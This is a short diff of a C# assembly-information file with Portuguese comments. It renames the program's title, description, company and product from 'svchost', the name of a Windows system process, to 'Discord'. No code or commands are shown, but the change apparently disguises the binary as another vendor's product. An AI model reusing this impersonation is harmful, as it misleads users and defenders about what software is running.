@@ -4,11 +4,11 @@ using System.Runtime.InteropServices;
 // As informações gerais sobre um assembly são controladas por
 // conjunto de atributos. Altere estes valores de atributo para modificar as informações
 // associadas a um assembly.
-[assembly: AssemblyTitle("svchost")]
-[assembly: AssemblyDescription("svchost")]
+[assembly: AssemblyTitle("Discord")]
+[assembly: AssemblyDescription("Discord")]
 [assembly: AssemblyConfiguration("")]
-[assembly: AssemblyCompany("svchost")]
-[assembly: AssemblyProduct("svchost")]
+[assembly: AssemblyCompany("Discord")]
+[assembly: AssemblyProduct("Discord")]
 [assembly: AssemblyCopyright("Copyright ©  2020")]
 [assembly: AssemblyTrademark("")]
 [assembly: AssemblyCulture("")]
